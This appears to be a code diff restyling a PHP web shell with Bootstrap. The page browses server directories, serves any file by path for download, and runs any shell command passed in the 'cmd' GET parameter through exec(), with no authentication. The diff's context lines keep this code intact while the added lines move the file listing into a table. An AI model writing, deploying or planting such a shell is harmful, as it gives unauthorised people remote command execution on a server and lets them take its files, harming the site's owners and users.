@@ -18,6 +18,17 @@ if (isset($_GET['download'])) {
 ?>
 
 <html>
+<!-- Latest compiled and minified CSS -->
+<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
+
+<!-- jQuery library -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+
+<!-- Latest compiled JavaScript -->
+<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<div class="container">
+
 
 <?php
 
@@ -64,21 +75,11 @@ if ($dir == NULL or !is_dir($dir)) {
 $dir = realpath($dir.'/'.$value);
 
 $dirs = scandir($dir);
-echo "Viewing directory " . $dir . "<br><br>";
-foreach ($dirs as $key => $value) {
-	if (is_dir(realpath($dir.'/'.$value))) {
-		echo "<a href='". $_SERVER['PHP_SELF'] . "?dir=". realpath($dir.'/'.$value) . "/'>". $value . "</a> " . printPerms($dir) . "\n<br>";
-	}
-	else {
-		echo "<a href='". $_SERVER['PHP_SELF'] . "?download=". realpath($dir.'/'.$value) . "'>". $value . "</a> " . printPerms($dir) . "\n<br>";
-	}
-}
-
+echo "<h2>Viewing directory " . $dir . "</h2>";
 echo "\n<br><form action='".$_SERVER['PHP_SELF']."' method='GET'>";
 echo "<input type='hidden' name='dir' value=".$dir." />";
 echo "<input type='text' name='cmd' autocomplete='off' autofocus>\n<input type='submit' value='Execute'>\n";
 echo "</form>";
-
 if (isset($_GET['cmd'])) {
 	echo "<br><br><b>Result of command execution: </b><br>";
 	exec('cd '.$dir.' && '.$_GET['cmd'], $cmdresult);
@@ -86,12 +87,35 @@ if (isset($_GET['cmd'])) {
 		echo "$value \n<br>";
 	}
 }
+echo "<br>";
+?>
 
+<table class="table table-hover table-bordered">
+    <thead>
+      <tr>
+        <th>Name</th>
+        <th>Permissions</th>
+      </tr>
+    </thead>
+    <tbody>
+<?php
+foreach ($dirs as $key => $value) {
+	echo "<tr>";
+	if (is_dir(realpath($dir.'/'.$value))) {
+		echo "<td><a href='". $_SERVER['PHP_SELF'] . "?dir=". realpath($dir.'/'.$value) . "/'>". $value . "</a></td><td> " . printPerms($dir) . "</td>\n";
+	}
+	else {
+		echo "<td><a href='". $_SERVER['PHP_SELF'] . "?download=". realpath($dir.'/'.$value) . "'>". $value . "</a></td><td> " . printPerms($dir) . "</td>\n";
+	}
+	echo "</tr>";
+}
+echo "</tbody>";
+echo "</table>";
 
 
 ?>
 
 
 
-
+</div>
 </html>
